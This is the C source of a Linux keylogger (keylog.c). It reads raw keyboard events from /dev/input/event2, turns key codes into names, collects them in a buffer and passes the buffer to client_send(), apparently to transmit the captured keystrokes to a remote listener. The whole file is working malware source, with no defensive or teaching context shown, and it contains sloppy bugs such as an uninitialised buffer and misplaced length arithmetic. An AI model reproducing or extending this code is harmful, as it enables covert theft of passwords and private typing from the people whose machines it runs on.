/*** keylog.c ***/

#include <unistd.h>
#include <signal.h>
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <stdlib.h>
#include <linux/input.h>
#include "keylog.h"


char *keys[] = {
  "[KEY_RESERVED]",
  "[KEY_ESC]",
  "[KEY_1]",
  "[KEY_2]",
  "[KEY_3]",
  "[KEY_4]",
  "[KEY_5]",
  "[KEY_6]",
  "[KEY_7]",
  "[KEY_8]",
  "[KEY_9]",
  "[KEY_0]",
  "[KEY_MINUS]",
  "[KEY_EQUAL]",
  "[KEY_BACKSPACE]",
  "[KEY_TAB]",
  "[KEY_Q]",
  "[KEY_W]",
  "[KEY_E]",
  "[KEY_R]",
  "[KEY_T]",
  "[KEY_Y]",
  "[KEY_U]",
  "[KEY_I]",
  "[KEY_O]",
  "[KEY_P]",
  "[KEY_LEFTBRACE]",
  "[KEY_RIGHTBRACE]",
  "[KEY_ENTER]",
  "[KEY_LEFTCTRL]",
  "[KEY_A]",
  "[KEY_S]",
  "[KEY_D]",
  "[KEY_F]",
  "[KEY_G]",
  "[KEY_H]",
  "[KEY_J]",
  "[KEY_K]",
  "[KEY_L]",
  "[KEY_SEMICOLON]",
  "[KEY_APOSTROPHE]",
  "[KEY_GRAVE]",
  "[KEY_LEFTSHIFT]",
  "[KEY_BACKSLASH]",
  "[KEY_Z]",
  "[KEY_X]",
  "[KEY_C]",
  "[KEY_V]",
  "[KEY_B]",
  "[KEY_N]",
  "[KEY_M]",
  "[KEY_COMMA]",
  "[KEY_DOT]",
  "[KEY_SLASH]",
  "[KEY_RIGHTSHIFT]",
  "[KEY_KPASTERISK]",
  "[KEY_LEFTALT]",
  "[KEY_SPACE]",
  "[KEY_CAPSLOCK]",
  "[KEY_F1]",
  "[KEY_F2]",
  "[KEY_F3]",
  "[KEY_F4]",
  "[KEY_F5]",
  "[KEY_F6]",
  "[KEY_F7]",
  "[KEY_F8]",
  "[KEY_F9]",
  "[KEY_F10]",
  "[KEY_NUMLOCK]",
  "[KEY_SCROLLLOCK]"
  };

void safebreak(){
	exit(0);
}

void main()
{
	char message[SIZEOF_MESSAGE];

	//open the eventX file that records keystrokes
	char keyboardPath_EVENTUALLYREPLACE[] = "/dev/input/event2";
	int device = open(keyboardPath_EVENTUALLYREPLACE, O_RDONLY);
	struct input_event inpEvent;

	// safely break from loop when Ctrl-C is pressed
	signal(SIGINT, safebreak);

while(1)
{
	usleep(1000);
	read(device, &inpEvent, sizeof(inpEvent));  
	//if the type of the event is a state change (like of a keyboard)
	if (inpEvent.type == 1 && inpEvent.value == 1)
	{
		//if the event code indicates a standard keyboard button
		if (inpEvent.code > 0 && inpEvent.code <= TOT_KEYS)
		{
			if (strlen(message) + strlen(keys[inpEvent.code] + 1) < SIZEOF_MESSAGE) 
			{
				strcat(message, keys[inpEvent.code]);
				strcat(message, " ");
			}
			else 
			{
				client_send(message);
				strcpy(message, "");
				strcat(message, keys[inpEvent.code]);
			}
		}
                else if (inpEvent.code == 108 || inpEvent.code == 105 || inpEvent.code == 103 || inpEvent.code == 106 || inpEvent.code == 100)
                {
                  char *str;
                  if (inpEvent.code == 108)
                  {
                    str = "[KEY_DOWN]";  
                  }
                  else if (inpEvent.code == 105)
                  {
                    str = "[KEY_LEFT]";
                  }
                  else if (inpEvent.code == 103)
                  {
                    str = "[KEY_UP]";
                  }
                  else if (inpEvent.code == 106)
                  {
                    str = "[KEY_RIGHT]";
                  }
                  else
                  {
                    str = "[KEY_RIGHTALT]";
                  }

                 if (strlen(message) + strlen(str + 1) < SIZEOF_MESSAGE)
                        {
                          strcat(message, str);
                          strcat(message, " ");
                        }
                        else
                        {
                          client_send(message);
                          strcpy(message, "");
                          strcat(message, str);
                        }
                }
	}
  }
}
